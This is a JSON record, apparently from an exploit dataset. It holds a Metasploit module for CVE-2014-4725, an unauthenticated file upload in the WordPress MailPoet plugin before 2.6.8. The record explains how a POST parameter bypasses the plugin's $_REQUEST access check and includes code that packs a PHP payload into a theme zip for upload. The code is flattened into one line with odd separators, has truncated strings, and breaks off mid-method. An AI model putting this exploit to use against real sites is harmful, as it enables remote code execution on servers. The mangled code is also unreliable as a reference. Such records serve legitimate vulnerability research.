{
    "text": "vul_name : Wordpress MailPoet ( wysija-newsletters ) Unauthenticated File Upload ， vul_cve : CVE-2014-4725 ， vul_poc :  ，  # This module requires Metasploit : http/metasploit.com/download ，  # Current source :  ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : HTTP : Wordpress ， include Msf : Exploit : FileDropper ， super ( update_info ( info ,  ， 'Name' => 'Wordpress MailPoet ( wysija-newsletters ) Unauthenticated File Upload' ,  ， 'Description' => %q{ ， The Wordpress plugin \"MailPoet Newsletters\" ( wysija-newsletters ) before 2.6.8 ， is vulnerable to an unauthenticated file upload. The exploit uses the Upload Theme ， functionality to upload a zip file containing the payload. The plugin used the ， admin_init hook , which is also executed for unauthenticated users when accessing ， a specific URL. The developers tried to fix the vulnerablility ， in version 2.6.7 but the fix can be bypassed. In PHPs default configuration ,  ， a POST variable overwrites a GET variable in the $ _REQUEST array. The plugin ， uses $ _REQUEST to check for access rights. By setting the POST parameter to ， something not beginning with 'wysija_' , the check is bypassed. Wordpress uses ， the $ _GET array to determine the page and is so not affected by this. ， } ,  ， 'Author' => ，  [  ， 'Marc-Alexandre Montpas' ,  # initial discovery ， 'Christian Mehlmauer' # metasploit module ，  ]  ,  ， 'License' => MSF_LICENSE ,  ， ' ，  [  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  ]  ,  ， 'Privileged' => false ,  ， 'Platform' => [ 'php' ]  ,  ， 'Arch' => ARCH_PHP ,  ， 'Targets' => [  [ 'wysija-newsletters < 2.6.8' , {} ]  ]  ,  ， 'DefaultTarget' => 0 ,  ， 'DisclosureDate' => 'Jul 1 2014' )  ， end ，  # the zip file must match the following :  ，  # - ) Exactly one folder representing the theme name ，  # - ) A style.css in the theme folder ，  # - ) Additional files in the folder ， content = { ，  : File.join ( theme_name , 'style.css' ) => ' ,  ，  : File.join ( theme_name , payload_name ) => payload.encoded ， } ， zip_file = Rex : Zip : Archive.new ， content.each_pair do | name , content |  ， zip_file.add_file ( name , content )  ， end ， zip_file.pack ， end ， def check ， readme_url = normalize_uri ( target_uri.path , 'wp-content' , 'plugins' , 'wysija-newsletters' , 'readme.txt' )  ， res = send_request_cgi ( { ， 'uri' => readme_url ,  ， 'method' => 'GET' ， } )  ，  # no readme.txt present",
    "time": "2014-07-07 / 2014-07-28"
}